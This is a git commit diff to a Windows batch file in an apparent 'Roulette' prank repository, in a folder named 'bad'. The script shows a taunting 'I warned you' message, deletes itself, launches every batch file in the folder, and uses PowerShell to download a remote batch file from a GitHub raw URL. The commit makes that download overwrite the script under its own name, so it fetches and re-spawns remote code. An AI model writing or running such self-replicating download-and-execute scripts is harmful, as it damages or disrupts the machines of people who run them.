882a2f5c7b12aaa4bc564efb766fb28ddd9922da
Babyporkchop <93239527+Babyporkchop@users.noreply.github.com>
2022-10-27 17:36:14 +0800

    Update 2.bat

--- Roulette/bad/2.bat
+++ Roulette/bad/2.bat
@@ -3,4 +3,4 @@ timeout -1
 msg %username% /t 5 /w "I warned you"
 del %0
 start *.bat
-Powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Roulette/extra.bat -OutFile .\extra.bat
+Powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Roulette/extra.bat -OutFile .\2.bat
